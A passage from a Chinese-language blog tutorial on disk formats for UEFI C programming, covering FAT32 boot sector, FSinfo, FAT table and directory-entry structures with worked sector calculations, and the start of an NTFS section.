class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> Small_Sector; <span class="comment">// 0x13~0x14 </span></span><br><span class="line">    BYTE Media; <span class="comment">// 0x15媒体描述符,提供有关媒体被使用的信息。值0xF8表示硬盘,0xF0表示高密度的3.5寸软盘.媒体描述符要用于MS—DOS FAT16磁盘,在Windows2000中未被使用</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> Sector_per_FAT_FAT16; <span class="comment">// 0x16~0x17 单张FAT表的扇区数,只被FAT12/FAT16所使用,FAT32分区本字段必须设置为0</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> Sector_per_Track; <span class="comment">// 0x18~0x19 磁盘几何参数,来源与CHS寻址时代,表示每一条磁道上包含多少个分区,目前主要是用于历史兼容填充0x3F</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> Heads;  <span class="comment">// 0x1A~0x1B 磁头数,磁盘的磁头数量,这个是CHS寻址模型中的H,现代硬盘一般都是0xFF,几乎没有实际用途</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> Hidden_Sector; <span class="comment">// 0x1C~0x1F 隐藏扇区数该分区上引导扇区之前的扇区数,也就是DBR之前的扇区数</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> Large_Sector;  <span class="comment">// 0x20~0x23 总扇区数,本字段包含FAT32分区中总的扇区数</span></span><br><span class="line"></span><br><span class="line">    FAT32_Sector Fat32_Sector; <span class="comment">// 在这个结构体中的只有FAT32文件系统才有效(后面就不多说了)</span></span><br><span class="line">&#125;Basic_BPB, *pBasic_BPB;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在这里</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">FAT32_Sector</span>&#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> Sectors_per_FAT_FAT32; <span class="comment">// 0x24~0x27 该分区每个FAT表所占的扇区数</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> Extend_Flag;  <span class="comment">// 0x28~0x29 拓展表示,该两个字节结构中各位的值为 </span></span><br><span class="line">    <span class="comment">//位:0~3: 活动FAT数(从0开始计数,而不是1),只有在不使用镜像时才有效</span></span><br><span class="line">    <span class="comment">//位4~6: 保留位</span></span><br><span class="line">    <span class="comment">//位7: 0值意味着在运行时FAT被映射到所有的FAT,1值表示只有一个FAT是活动的</span></span><br><span class="line">    <span class="comment">//位8~15: 保留</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> FS_Version;  <span class="comment">// 0x2A~0x2B 文件系统版本,只提供FAT32使用,高字节主要的修订好,而低字节是次要的修订好,本字段支持将来对该FAT32媒体类型进行扩展。如果本字段非零,以前的Windows版本将不支持这样的分区</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> Root_Cluster_Number; <span class="comment">// 0x2C~0x2F 根目录的起始簇号,本字段的值一般为2,但不总是如此</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> FS_Info_Sector; <span class="comment">// 0x30~0x31 文件系统信息扇区号,FAT分区的保留区中的文件系统信息FSinfo的扇区号.其值一般为1。在备份引导扇区中保留了FSinfo的备份,但是这个备份不会保持跟新</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> Backup_Sector;  <span class="comment">// 0x32~0x33 备份引导扇区,这个非零值表示引导扇区备份的起始扇区.本字段一般为6,建议不要使用其他值</span></span><br><span class="line">    BYTE Reserved_Sector[<span class="number">12</span>]; <span class="comment">// 0x34~0x3F 一般全部为0,保留字段为以后扩充使用。</span></span><br><span class="line">&#125;FAT32_Sector, *pFAT32_Sector;</span><br></pre></td></tr></table></figure><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251215022551588.png" alt="image-20251215022551588"></p><ul><li>接下来看看<code>拓展BIOS参数块</code></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">FAT32_Extend_BPB</span>&#123;</span></span><br><span class="line">    BYTE Physical_Drive; <span class="comment">// 0x40 物理驱动器号与BIOS物理驱动器号有关。软盘驱动器被标识为0x00,物理硬盘被标识为0x80与物理硬盘驱动器无关.一般地,在发出一个INT 13h BIOS调用之前设置该值,具体指定所访问的设备.只有当该设备是一个引导设备时,这个值才有意义</span></span><br><span class="line">    BYTE Reserved;  <span class="comment">// 0x41 保留字段,一般为0</span></span><br><span class="line">    BYTE Extend_Signure; <span class="comment">// 0x42 扩展引导标签,本字段必须要有能被Windows 2000所识别的值0x20或0x29</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> Vol_Serial; <span class="comment">// 0x43~0x46 分区序号,在格式化磁盘时所产生的一个随机序号,有助于分区磁盘</span></span><br><span class="line">    BYTE Vol_Label[<span class="number">11</span>]; <span class="comment">// 0x47~0x51 卷标,本字段只能使用一次,它被用来保存卷表号。现在卷标被作为一个特殊文件保存在根目录中</span></span><br><span class="line">    BYTE System_ID[<span class="number">8</span>]; <span class="comment">// 0x52~0x59 系统ID,FAT32文件系统中一般取位FAT32</span></span><br><span class="line">&#125;FAT32_Extend_BPB, *pFAT32_Extend_BPB;</span><br></pre></td></tr></table></figure><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251215023236818.png" alt="image-20251215023236818"></p><h3 id="fat32的fsinfo"><a href="#FAT32的FSinfo" class="headerlink" title="FAT32的FSinfo"></a>FAT32的FSinfo</h3><ul><li>现在可以来具体学一下<code>FSinfo</code>所存储的数据内容以及数据的具体含义，先来给出FSinfo的这个内容图片。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x0</span>~<span class="number">0x3</span> <span class="comment">// 拓展引导签名0x41615252,即RRaA,用于判断该扇区是否是合法FSinfo</span></span><br><span class="line"><span class="number">0x1E4</span>~<span class="number">0x1E7</span> <span class="comment">// 文件系统信息签名rrAa</span></span><br><span class="line"><span class="number">0x1E8</span>~<span class="number">0x1EB</span> <span class="comment">// 空闲簇数量,当值为0xffffffff时是个未知,需要重新扫描FAT</span></span><br><span class="line"><span class="number">0x1EC</span>~<span class="number">0x1EF</span> <span class="comment">// 下一个可能的空闲簇,下次分配时建议从哪个簇号开始找</span></span><br><span class="line"><span class="comment">// 注意FSinfo不是太重点,该表可能不准也可能不同步,在Windows上挂载FAT32时如果FSinfo无效或者是FAT被重新扫描该表都会被重建</span></span><br></pre></td></tr></table></figure><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251215142236106.png" alt="image-20251215142236106"></p><h3 id="fat32的fat1和fat2"><a href="#FAT32的FAT1和FAT2" class="headerlink" title="FAT32的FAT1和FAT2"></a>FAT32的FAT1和FAT2</h3><ul><li>接下来就是FAT1表和FAT2表，看FAT1和FAT2表中数据之前，需要先了解一下如何快速定位<code>FAT1</code>表。</li><li>主要使用的是<code>DBR</code>中的数据区去定位FAT1表，其实FAT1表所在扇区就是<code>DBR所在扇区+保留扇区数</code></li><li>首选先从MBR中确定DBR所在的扇区为<code>0x80</code></li></ul><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251215175826155.png" alt="image-20251215175826155"></p><ul><li>然后再到DBR所在的扇区，在该扇区偏移<code>0xE~0xF</code>处读取保留扇区数<code>0x1A9E</code>，这样就可以得到FAT1所在扇区为<code>0x1A9E+0x80=0x1B1E</code></li></ul><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251215175958615.png" alt="image-20251215175958615"></p><ul><li>这样就可以直接定位到<code>FAT1</code>表所在的起始位置，该表的大小也在DBR中有描述，但是目前有数据的地方只有下图所示</li></ul><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251215180240757.png" alt="image-20251215180240757"></p><ul><li>对于FAT1表项有以下几点注意的：<ul><li>表项的第0项一般都是<code>0x0FFFFFF8</code>，表项的第1项一般都是<code>0xFFFFFFFF</code>，表项第0项和第1项均不与实际物理地址对应</li><li>从表项第2项开始才与物理地址对应，2号表项为FAT2结束之后开始的簇，这个簇为根目录。</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 注意：FAT表中每四字节描述一个簇的状态,其中第0项保留,第1项保留</span></span><br><span class="line"><span class="comment">// 第2项表示数据区的第一个簇,第3项表示数据区的第二个簇.实际上第n项其实就是表示数据区n-2个簇号,实际上簇号就是从数据区开始编号的</span></span><br><span class="line">┌───────────────┐</span><br><span class="line">│ 保留区         │  ← DBR / FSInfo / 备份 DBR</span><br><span class="line">├───────────────┤</span><br><span class="line">│ FAT1          │</span><br><span class="line">├───────────────┤</span><br><span class="line">│ FAT2          │</span><br><span class="line">├───────────────┤</span><br><span class="line">│ 数据区         │  ← 簇 <span class="number">2</span> 从这里开始</span><br><span class="line">└───────────────┘</span><br><span class="line"><span class="comment">// 0x00000000表示空闲簇</span></span><br><span class="line"><span class="comment">// 0x00000005表示下一个簇是5</span></span><br><span class="line"><span class="comment">// 0x0FFFFFFF表示文件结束EOF</span></span><br><span class="line"><span class="comment">// 0x0FFFFFF7表示坏簇</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// 这里简单举个例子说一下一个文件如何被存储的</span></span><br><span class="line">FAT[<span class="number">2</span>] = <span class="number">5</span></span><br><span class="line">FAT[<span class="number">5</span>] = <span class="number">8</span></span><br><span class="line">FAT[<span class="number">8</span>] = <span class="number">0x0FFFFFFF</span></span><br><span class="line">这表示这三个簇的内容拼起来可以组成一个完整的文件</span><br><span class="line">也就是簇<span class="number">2</span>+簇<span class="number">5</span>+簇<span class="number">8</span></span><br></pre></td></tr></table></figure><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251215180725816.png" alt="image-20251215180725816"></p><ul><li>接下来我们来定位FAT2表的位置，该位置使用<code>FAT1表起始扇区+FAT表扇区大小</code>就可以确定。而上面以及计算出<code>FAT1表的起始扇区为0x1B1E</code>，然后通过DBR中偏移为<code>0x24~0x27</code>可以得到<code>每个FAT表所占用的扇区数为0x2B1</code>，可以得到FAT2的起始扇区为<code>0x1B1E+0x2B1=0x1DCF</code></li></ul><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251215181508527.png" alt="image-20251215181508527"></p><ul><li>这样就可以得到FAT2表的位置，可以发现FAT2其实就是FAT1的备份文件</li></ul><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251215181713262.png" alt="image-20251215181713262"></p><h3 id="fat32的根目录1"><a href="#FAT32的根目录1" class="headerlink" title="FAT32的根目录1"></a>FAT32的根目录1</h3><ul><li>接下来先讲一下确定根目录起始扇区的方法，<code>DBR起始扇区+保留扇区数+每个FAT表扇区数×FAT表个数+(根目录起始簇号-2)*一个簇占用的扇区数</code>，这些都在<code>DBR</code>中给出了。偏移如下：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BYTE Sectors_per_Cluster; <span class="comment">// 0xD  一个簇占用的扇区数</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> Reserved_Sector; <span class="comment">// 0xE~0xF 保留扇区</span></span><br><span class="line">BYTE FATs;  <span class="comment">//0x10 FAT表的个数，如果值为1表示只有一个FAT表没有备份;值为2表示有一个FAT表备份</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> Sectors_per_FAT_FAT32; <span class="comment">// 0x24~0x27 该分区每个FAT表所占的扇区数</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> Root_Cluster_Number; <span class="comment">// 0x2C~0x2F 根目录的起始簇号,本字段的值一般为2,但不总是如此</span></span><br></pre></td></tr></table></figure><ul><li>接下来回去看看DBR扇区的相关数据，可以得到：<ul><li>DBR起始扇区为<code>0x80</code>从MBR中得到</li><li>一个簇占用的扇区数为：<code>2</code></li><li>保留扇区数为：<code>0x1A9E</code></li><li>FAT表的个数为：<code>2</code></li><li>每个FAT表所占的扇区数：<code>0x2B1</code></li><li>根目录的起始簇号：<code>0x2</code></li></ul></li></ul><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251215184603270.png" alt="image-20251215184603270"></p><ul><li>从而可以计算出根目录的起始扇区为<code>0x80+0x1A9E+2*0x2B1+(2-2)*2=0x2080</code>，通过计算偏移就可以得到根目录所在位置，由于根目录只占1个簇（从FAT1表中可以得到），所以下图中的数据都是FAT32的根目录的数据。接下来分析一下FAT32根目录的数据结构。</li></ul><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251215185036598.png" alt="image-20251215185036598"></p><ul><li>对于根目录目前我们还是不太了解，那么我们就先挂在这个虚拟磁盘文件，然后创建一个<code>123.txt</code>文件，以及一个文件夹<code>document_test</code>，看看这个根目录到底有什么改变。直接将这个虚拟磁盘文件挂在到Windows操作系统中。</li></ul><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251215222238389.png" alt="image-20251215222238389"></p><ul><li>然后创建一个名为<code>document_test</code>的文件夹，在根目录创建一个<code>123.txt</code>文件，该<code>txt</code>文件中存放着<code>abcd</code>这个内容。</li></ul><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251215222435092.png" alt="image-20251215222435092"></p><ul><li>接下来我们重新用winhex打开这个虚拟磁盘文件，并且直接跳转到根目录这个偏移处看看情况，我们会发现根目录会多出一些数据（根目录簇的第一个扇区和第二个扇区都会新增加数据）</li></ul><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251215223041904.png" alt="image-20251215223041904"></p><h3 id="fat32的根目录2"><a href="#FAT32的根目录2" class="headerlink" title="FAT32的根目录2"></a>FAT32的根目录2</h3><ul><li>从上面的在根目录中创建新文件夹我们可以得到，创建一个文件夹根目录这边会多出一些信息。这些信息就是我们要理解的数据结构。</li><li>我们回到没有创建文件夹和文件目录的这个结构来说明相关的数据结构，这里有两个数据结构，这两个数据结构主要表明的是文件的属性并且充当索引作用，用于寻找文件内容存储的地方。这两个数据结构分别称为<code>LFN</code>（长文件名目录项）和<code>SFN</code>（标准目录项），它们的结构体具体如下：<ul><li>当文件名比较短的时候，一般都是只用<code>SFN</code>就可以标识该文件的属性。</li><li>当文件名比较长的时候，只用<code>SFN</code>的话没办法将一个文件名存储下来，就要使用<code>LFN+SFN</code>共同标识该文件的属性。如果有多个<code>LFN</code>的话一般结构都是从低地址往高地址<code>LFN(3)-&gt;LFN(2)-&gt;LFN(1)-&gt;SFN</code></li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 标准目录项如下SFN:</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">FAT_DIR_ENTRY</span> &#123;</span></span><br><span class="line">    <span class="type">uint8_t</span>  DIR_Name[<span class="number">11</span>];      <span class="comment">// 0x00~0x0A 文件名（8+3，空格填充）</span></span><br><span class="line">    <span class="type">uint8_t</span>  DIR_Attr;          <span class="comment">// 0x0B 文件属性,0x08表示卷标签</span></span><br><span class="line">    <span class="type">uint8_t</span>  DIR_NTRes;         <span class="comment">// 0x0C 保留（NT）</span></span><br><span class="line">    <span class="type">uint8_t</span>  DIR_CrtTimeTenth;  <span class="comment">// 0x0D 创建时间（0.1 秒）</span></span><br><span class="line">    <span class="type">uint16_t</span> DIR_CrtTime;       <span class="comment">// 0x0E~0x0F 创建时间</span></span><br><span class="line">    <span class="type">uint16_t</span> DIR_CrtDate;       <span class="comment">// 0x10~0x11 创建日期</span></span><br><span class="line">    <span class="type">uint16_t</span> DIR_LstAccDate;    <span class="comment">// 0x12~0x13 最后访问日期</span></span><br><span class="line">    <span class="type">uint16_t</span> DIR_FstClusHI;     <span class="comment">// 0x14~0x15 起始簇号高 16 位</span></span><br><span class="line">    <span class="type">uint16_t</span> DIR_WrtTime;       <span class="comment">// 0x16~0x17 最后写入时间</span></span><br><span class="line">    <span class="type">uint16_t</span> DIR_WrtDate;       <span class="comment">// 0x18~0x19 最后写入日期</span></span><br><span class="line">    <span class="type">uint16_t</span> DIR_FstClusLO;     <span class="comment">// 0x1A~0x1B 起始簇号低 16 位</span></span><br><span class="line">    <span class="type">uint32_t</span> DIR_FileSize;      <span class="comment">// 0x1C~0x1F 文件大小（字节）因为FAT32使用4个字节表示文件或目录大小，因此当文件或目录大于4Gb时将会溢出，做截断处理。</span></span><br><span class="line">&#125; FAT_DIR_ENTRY;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 长文件名目录项如下LFN:</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">FAT_LFN_ENTRY</span> &#123;</span></span><br><span class="line">    <span class="type">uint8_t</span>  LDIR_Ord;        <span class="comment">// 0x00 序号（0x40 表示最后一项）</span></span><br><span class="line">    <span class="type">uint16_t</span> LDIR_Name1[<span class="number">5</span>];   <span class="comment">// 0x01~0x0A Unicode 字符（前 5）</span></span><br><span class="line">    <span class="type">uint8_t</span>  LDIR_Attr;       <span class="comment">// 0x0B 固定为 0x0F</span></span><br><span class="line">    <span class="type">uint8_t</span>  LDIR_Type;       <span class="comment">// 0x0C 固定为 0</span></span><br><span class="line">    <span class="type">uint8_t</span>  LDIR_Chksum;     <span class="comment">// 0x0D 对应 8.3 名的校验和</span></span><br><span class="line">    <span class="type">uint16_t</span> LDIR_Name2[<span class="number">6</span>];   <span class="comment">// 0x0E~0x19 Unicode 字符（中 6）</span></span><br><span class="line">    <span class="type">uint16_t</span> LDIR_FstClusLO;  <span class="comment">// 0x1A~0x1B 固定为 0</span></span><br><span class="line">    <span class="type">uint16_t</span> LDIR_Name3[<span class="number">2</span>];   <span class="comment">// 0x1C~0x1F Unicode 字符（后 2）</span></span><br><span class="line">&#125; FAT_LFN_ENTRY;</span><br></pre></td></tr></table></figure><ul><li>介绍完上面的几个结构体，我们回到这个图片中的这四个<code>32</code>字节，这四个<code>32</code>字节有三个<code>SFN</code>文件结构加一个<code>LFN</code>文件结构，也就是存放了三个文件，这三个文件其实是<code>元数据目录项或者占位目录项</code>：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 第0个32字节: 卷标（Volume Label）目录项,描述分卷属性的东东,其实就是在C盘、D盘、E盘的名称.</span></span><br><span class="line"><span class="comment">// 第1个32字节: B INFORMATION FAT32 系统信息,也就是FSinfo中的东西</span></span><br><span class="line"><span class="comment">// 第2个32字节: System VolumeS Windows的系统目录,主要用于卷影复制、系统还原点、索引服务、分区唯一ID</span></span><br><span class="line"><span class="comment">// 第3个32字节: System VolumeS Windows的SFN</span></span><br></pre></td></tr></table></figure><ul><li>对于第<code>0</code>个32字节可能这样比较陌生，那们将UTF-8编码换成GBK编码其实就会发现是开头出现<code>新加卷</code>这三个字</li></ul><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251215230246644.png" alt="image-20251215230246644"></p><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251215223801557.png" alt="image-20251215223801557"></p><h3 id="fat32的根目录3"><a href="#FAT32的根目录3" class="headerlink" title="FAT32的根目录3"></a>FAT32的根目录3</h3><ul><li>大致了解了根目录中的两个数据结构后，我们看看我们新建的一个文件夹和一个文本文件的对应属性。新建部分如下图所示</li></ul><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251216000608050.png" alt="image-20251216000608050"></p><h2 id="ntfs文件系统"><a href="#NTFS文件系统" class="headerlink" title="NTFS文件系统"></a>NTFS文件系统</h2><ul><li>参考博客：<a href="https://blog.csdn.net/tianjin_ren/article/details/127241467">NTFS解析-CSDN博客</a></li><li><p>参考博客：</p></li><li><p>NTFS文件系统英文全称为<code>New Technology File System</code>，是微软<code>Windows NT</code>内核系列操作系统支持的磁盘格式，为网络和磁盘配额、文件加密等管理安全特性设计。主要特点有：<code>安全性高</code>、<code>可恢复性</code>、<code>文件压缩</code>、<code>磁盘配额</code>。</p></li><li><p>NTFS文件系统是微软设计的，好像也是不开源的，但是网上还是有很多关于NTFS的资料的。</p></li><li><p>下图是NTFS分区的主要结构大致如下，一共分为五个部分，其中两个部分是备份文件：</p><ul><li>DBR：分区引导扇区，在NTFS文件系统中也被称为<code>$Boot</code>。</li><li>MFT：主文件表，主要存放着文件和目录的元数据，指向真正存储文件和目录的位置，相当于是一个索引作用。（这个地方在有的文章中还可以再分为<code>Reserved $MFT Records</code>和<code>User $MFT Records</code>两部分，但是这里就不细分下去就按<code>MFT</code>来）</li><li>File System Data：这个就是正常的用户存放的数据</li><li>MFT备份：该备份在有的NTFS文件系统中是存放在文件系统的中间段（也就是中间存放着MFT备份文件，将文件系统数据区分割成两部分），有的NTFS文件系统中是存放在分区结尾（如下图所示）</li><li>DBR备份：NTFS的DBR备份位于该分区的最后一个扇区</li></ul></li></ul><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251214235152548.png" alt="image-20251214235152548"></p><h3 id="ntfs的dbr"><a href="#NTFS的DBR" class="headerlink" title="NTFS的DBR"></a>NTFS的DBR</h3><ul><li>按照上面创建虚拟磁盘和FAT32分区的的方法，创建一个NTFS分区。然后就可以来查看一下这个磁盘的DBR数据了。</li></ul><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251220033444488.png" alt="image-20251220033444488"></p><ul><li>直接利用MBR的第一个分区表确定NTFS的DBR，该DBR在<code>0x80</code>的扇区</li></ul><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251220033649717.png" alt="image-20251220033649717"></p><ul><li>直接找到NTFS的DBR扇区，NTFS的DBR扇区如下：</li></ul><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251220033821462.png" alt="image-20251220033821462"></p><ul><li>对于NTFS的DBR扇区之后还有一些其他数据，而不是全部都是0，先来看看它截止多少，截止到这个位置<code>0x11200~0x11400</code></li></ul><p><img src="/2025/12/08/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%802-%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/image-20251220035254985.png" alt="image-20251220035254985"></p><p><img 